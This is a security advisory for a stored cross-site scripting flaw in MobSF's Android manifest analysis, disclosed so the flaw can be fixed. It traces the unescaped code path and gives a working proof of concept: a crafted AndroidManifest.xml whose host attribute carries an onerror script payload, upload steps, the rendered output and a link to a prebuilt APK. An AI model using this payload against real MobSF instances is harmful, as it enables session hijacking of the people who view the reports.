# MobSF has Stored XSS via Manifest Analysis - Dialer Code Host Field

**GHSA**: GHSA-8hf7-h89p-3pqj | **CVE**: CVE-2026-24490 | **Severity**: high (CVSS 8.1)

**CWE**: CWE-79

**Affected Packages**:
- **mobsf** (pip): < 4.4.5

## Description

### Summary
A Stored Cross-site Scripting (XSS) vulnerability in MobSF's Android manifest analysis allows an attacker to execute arbitrary JavaScript in the context of a victim's browser session by uploading a malicious APK. The `android:host` attribute from `<data android:scheme="android_secret_code">` elements is rendered in HTML reports without sanitization, enabling session hijacking and account takeover.

### Details
When MobSF analyzes an Android APK containing a `<data>` element with `android:scheme="android_secret_code"`, it extracts the `android:host` attribute and inserts it directly into the analysis report without HTML escaping.

### Vulnerable Code Path

**1. Data Extraction** - `mobsf/StaticAnalyzer/views/android/manifest_analysis.py` (line 776):
```python
xmlhost = data.getAttribute(f'{ns}:host')
ret_list.append(('dialer_code_found', (xmlhost,), ()))
```

**2. Template String Formatting** - `mobsf/StaticAnalyzer/views/android/manifest_analysis.py` (line 806):
```python
'title': a_template['title'] % t_name,  # XSS payload inserted here unescaped
```

**3. Template Definition** - `mobsf/StaticAnalyzer/views/android/kb/android_manifest_desc.py` (line 200):
```python
'dialer_code_found': {
    'title': 'Dailer Code: %s Found <br>[android:scheme=\"android_secret_code\"]',
    ...
}
```

**4. Unsafe Rendering** - `mobsf/templates/static_analysis/android_binary_analysis.html` (line 1143):
```html
{{item|key:"title" | safe}}
```

The `|safe` Django template filter bypasses auto-escaping, allowing the unescaped `android:host` value to be rendered as raw HTML.

### PoC

### Step 1: Create Malicious APK

Create an APK with the following `AndroidManifest.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.poc.xsstest"
    android:versionCode="1"
    android:versionName="1.0">

    <application android:label="XSS PoC Test">
        <receiver android:name=".SecretCodeReceiver" android:exported="true">
            <intent-filter>
                <action android:name="android.provider.Telephony.SECRET_CODE"/>
                <data android:scheme="android_secret_code"
                      android:host="&lt;img src=x onerror=alert(document.domain)&gt;"/>
            </intent-filter>
        </receiver>
    </application>
</manifest>
```

### Step 2: Build the APK

Use apktool or Android build tools to create a valid APK with this manifest.

### Step 3: Upload to MobSF

Upload the malicious APK to MobSF for static analysis.

### Step 4: Trigger XSS

View the static analysis report in a browser. The JavaScript payload executes automatically.

### Confirmed HTML Output

```html
<td>
Dailer Code: <img src=x onerror=alert(document.domain)> Found <br>[android:scheme="android_secret_code"]
</td>
```

### PoC APK Details

| Field | Value |
|-------|-------|
| **Filename** | `POC_XSS_APK.apk ` |
| **MD5 Hash** | `647258656ed03a7e6a0f2acce4ec6a5b` |
| **Location** | https://github.com/smaranchand/poc/raw/refs/heads/main/POC_XSS_APK.apk |

### Impact

This is a **Stored Cross-site Scripting (XSS)** vulnerability affecting all MobSF users who analyze the results of the malicious APK file.

### Attack Scenario

1. Attacker crafts a malicious APK with XSS payload in the manifest
2. Attacker submits APK to a shared MobSF instance or  private mobsf instance. 
3. When any user views the analysis report, the XSS payload executes in their browser

<img width="1435" height="675" alt="Screenshot 2026-01-15 at 12 24 29 AM" src="https://github.com/user-attachments/assets/e282a0b2-236e-4199-a7ce-b96017cc7052" />


Tested in MobSF Public Instance as well.
https://mobsf.live/static_analyzer/647258656ed03a7e6a0f2acce4ec6a5b/ 


<img width="1440" height="780" alt="Screenshot 2026-01-15 at 12 24 57 AM" src="https://github.com/user-attachments/assets/8673b76a-954a-45e7-833a-a64e0a972f2e" />
